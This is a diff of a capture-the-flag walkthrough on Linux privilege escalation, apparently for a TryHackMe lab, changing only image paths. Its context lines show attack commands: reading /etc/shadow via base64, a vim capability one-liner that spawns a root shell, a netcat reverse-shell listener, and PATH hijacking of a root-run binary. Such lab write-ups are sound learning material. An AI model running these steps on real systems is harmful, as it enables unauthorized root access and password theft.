@@ -278,7 +278,7 @@ find / -type f -perm -04000 -ls 2>/dev/null
 ```
 
 i found my target !!
-![base64](../../../files/photos/base64.png)
+![base64](../../files/photos/base64.png)
 
 #### Let's read the shadow to get the hashes
 
@@ -288,7 +288,7 @@ base64 /etc/shadow | base64 -d
 
 and i found the desired hashes...
 
-![hash](../../../files/photos/hash.png)
+![hash](../../files/photos/hash.png)
 
 
 #### Let's crack the hash of `user2`
@@ -310,7 +310,7 @@ There is a capability for `VIM`....
 ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
 ```
 #### The Flag...
-![root](../../../files/photos/root.png)
+![root](../../files/photos/root.png)
 
 ---
 # Privilege Escalation: `Cron Jobs`
@@ -336,11 +336,11 @@ nc -lvnp {port}
 
 Get matt's password by accessing `/etc/shadow` from the rooted `revshell`
 
-![matt](../../../files/photos/matt.png)
+![matt](../../files/photos/matt.png)
 
 and crack it by john...
 
-![jo](../../../files/photos/jo.png)
+![jo](../../files/photos/jo.png)
 
 ---
 # Privilege Escalation: PATH
@@ -353,13 +353,13 @@ find / -writable 2>/dev/null
 
 Found it !!
 
-![find.png](../../../files/photos/find.png)
+![find.png](../../files/photos/find.png)
 
 #### Now go to the directory and write the code
 
 As it appears test runs thm as a root...
 
-![test](../../../files/photos/test.png)
+![test](../../files/photos/test.png)
 
 let's add a command to print the flag....
 
@@ -367,7 +367,7 @@ let's add a command to print the flag....
 echo 'cat /home/matt/flag6.txt' > thm
 ```
 
-![thm.png](../../../files/photos/thm.png)
+![thm.png](../../files/photos/thm.png)
 
 ---
 # Privilege Escalation: NFS
@@ -407,11 +407,11 @@ sudo chmod +s bb/rooted
 
 On host..
 
-![host.png](../../../files/photos/host.png)
+![host.png](../../files/photos/host.png)
 
 on Attacked Machine...
 
-![machine.png](../../../files/photos/machine.png)
+![machine.png](../../files/photos/machine.png)
 
 ---
 
@@ -424,17 +424,17 @@ find / -name flag1.txt 2>/dev/null
 
 And it is `base64`...
 
-![mhash.png](../../../files/photos/mhash.png)
+![mhash.png](../../files/photos/mhash.png)
 
 
 Cracking the hash...
 
-![hashed](../../../files/photos/hashed.png)
+![hashed](../../files/photos/hashed.png)
 
 Getting `flag1`
 
-![flag1.png](../../../files/photos/flag1.png)
+![flag1.png](../../files/photos/flag1.png)
 
 Using the `sudo` method and getting the `rootflag`..
 
-![rootf.png](../../../files/photos/rootf.png)
+![rootf.png](../../files/photos/rootf.png)
